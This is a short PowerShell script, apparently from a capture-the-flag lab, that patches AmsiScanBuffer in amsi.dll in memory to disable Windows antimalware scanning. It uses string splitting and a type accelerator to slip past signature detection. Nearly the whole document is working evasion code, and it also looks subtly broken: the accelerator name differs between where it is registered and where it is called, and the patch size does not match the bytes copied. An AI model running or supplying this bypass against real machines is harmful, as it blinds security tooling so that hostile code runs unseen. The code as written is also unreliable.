<# 
name: Liberman obscured

description:
  Modified version of the AMSIscan buffer pathcing method presetned by Tal Liberman at BlackHat 2018. Includes influence
  from Turla powershell implmentation to better model their TTPs. This disables AMSI both within the powershell and
  CLR. Utilizes type accelerator PSObject to obscure flagged code found by AMSITrigger.
  All credit goes to Liberman, Empire C&C Project and the THM hololive room authors
  THM FTW
#>
$MethodDefinition = "

    [DllImport(`"kernel32`")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport(`"kernel32`")]
    public static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport(`"kernel32`")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
";

$Kernel32 = Add-Type -MemberDefinition $MethodDefinition -Name 'Kernel32' -NameSpace 'Win32' -PassThru;
$ABSD = 'AmsiS'+'canBuffer';
$handle = [Win32.Kernel32]::GetModuleHandle('amsi.dll');
[IntPtr]$BufferAddress = [Win32.Kernel32]::GetProcAddress($handle, $ABSD);
[UInt32]$Size = 0x5;
[UInt32]$ProtectFlag = 0x40;
[UInt32]$OldProtectFlag = 0;
[Win32.Kernel32]::VirtualProtect($BufferAddress, $Size, $ProtectFlag, [Ref]$OldProtectFlag);
$buf = [Byte[]]([UInt32]0xB8,[UInt32]0x57, [UInt32]0x00, [Uint32]0x07, [Uint32]0x80, [Uint32]0xC3); 
[PSObject].Assembly.GetType("System.Management.Automation.TypeAccelerators")::Add('DAG0AT1', [system.runtime.interopservices.marshal])
[DAGOAT1]::copy($buf, 0, $BufferAddress, 6);
